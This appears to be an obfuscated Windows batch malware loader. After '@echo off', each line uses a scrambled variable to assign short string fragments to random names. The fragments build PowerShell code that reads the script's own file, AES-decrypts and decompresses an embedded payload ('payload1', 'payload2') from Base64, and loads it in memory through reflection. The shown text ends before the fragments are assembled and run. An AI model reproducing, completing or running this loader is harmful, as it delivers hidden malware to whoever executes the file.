@echo off
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "wrQinDmabh=.Key"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "aTbVDJeiwW=ess_"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "UjhdyqXnct=pres"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ZypMbPNkeQ=$eKz"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ydZcZhFkih='%~f0'"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "VfiESCbvIn=mory"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "OqEZUQbPfy=or_v"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "asralpODlV=$par"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NSrUWSTSza=lace"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "kxnGwUmLxK=ion."
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "cFcknYfGoh=e=[S"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "scDdOaYLNE=m.IO"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "fOItJxiRYQ=tle="
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "GyZQTfuhrL=tcEe"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "CxeAwzTNIS=::Fr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "sWNFGAfxtQ=ram2"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "xizUAoQkUg=Zvr."
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "QOxsFOgNGR=r[0]"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jJHdzHxnml=ress"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "JUZDHJWcoZ=st.U"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "FychNwADgk=ecur"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "iEeVEEdXvP=XC')"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "lCzbTzInSE=bA=="
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "YokEyjOCJb=phy."
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "zcEVIBHerj=);br"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "VDLHSJVVWj=_var"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NhdpskHXYA=decr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "mGVpdYgPmb=AllT"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "BpMRmIohar=func"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ZaSsuSlToA=on.C"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "LMURoFSFpM=alBl"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NpoMpFoDRp=aram"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ZODlFJNwHi=ncti"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "nEiWtmiVhW=ar.C"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "rzIFreClww=ert]"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "gZudaNDySV=payl"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "DsACkGjHQR=Asse"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "OfxASMJJPx=load"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "PhyizCjTDj=ad1_"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "SudFrDcrmT=_fun"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "nTlNToNhUW=xJY."
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "YfpMzfeYHb=ect "
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ZegyEEXmlu=).Re"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "MHAFdrZpNm=$aes"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "FdWUkVPLXT=ingM"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "xnLWRnNNnN=,'A'"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "kUZbiCJaOh=Syst"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "BnDyyMLtrG=se()"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "LgdngMvzbT=;$PI"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "hSZFyxEAJX=ar.D"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NHSECGqWfN=togr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "VDcMFOIpMw=or()"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "zdzKFFUszo=m.Se"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "pxFJKLBApd=essi"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "oLXCCIqCWp=stri"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "mkpEYgMVKT=zSo="
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "HiZMvBIuuO=erSh"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ChDEgqHiah=ypto"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "AYeEEEQxsO=n($p"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "NxZIwjXkyM=qUnu"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "QAkAgnuMMA=_var"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "uEfITMwkxH=trin"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "efEMCqQPJI=_fun"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "KwBakGWiQe=;exe"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "GRGGWZPEkM=t_fu"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "rECglaRVDZ=.Com"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "WyXQfdVeUu=ase6"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "sKawZPTGhz=oads"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "XLZWUgaGen=.Ref"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "JfznPSNuOI= dec"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "rnvyxLSwHX=aram"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "FighQQmpIA=ess)"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "igYntsmhaE=Cryp"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "DVlNmiDTbr=e();"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ipoPCAbkzS=es_v"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jQdjHvzWUT=_var"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "TVgcCtrXVG=plac"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "lguGSrZkas=aylo"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ySnihmGiYV=]::F"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "vAYihvgEUY=r_va"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "BjXDpzyszZ=]::L"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "kXKqUtPNSH=cryp"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jLTAewPJQN=ekLD"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "hIwUwODYlJ=rypt"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "WRFSLIjSRf=;$ae"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "fJNBgeidlB=v1.0"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "tMiIhAMNgV=){$k"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "vUIBIddsDj=ct S"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ySLqEiskxf=em.S"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "peVftWwtJI=ose("
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "AEhvObpjfo=omBa"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "eUCztGCrrv=){$E"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "dHMfbZfHmj=n($p"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "LkgDTenKfD=ctio"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "uMNmDivuCF=Ciph"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "EzpNFhhbWn=TAxJ"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "xKArDeBaAx=ad2_"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "ofAhbNGgeK=To($"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "wwZeGhAvOO=.Rep"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "vhMXuUqzaM=,$pa"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "jVMQQShBhy=)) |"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "afuPqbimLc=e.En"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "SsMjdyuBss=2\Wi"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "tqVtBbzyUP=::PK"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "VuHqfgHGZf=ompr"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "eODRgJOCUg=eak}"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "EThdEDQFnk=reac"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "cDVSdmGCny=ss_f"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "lCWjKpdmxf=owTi"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "rUCmmYWhXu=n (["
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "CibQIPVPpH=.Rep"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "htheysrFMI=sion"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "tViQkedNiM==dec"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "lKKKrWigZV=]]$b"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "EMpAYDkaOQ=essi"
!DjKKzfhTTcDfqbyOsTzennowpYdKzvPKESrzNaNglcwsFfFKLd! "xuCOyMufQX=ase6"
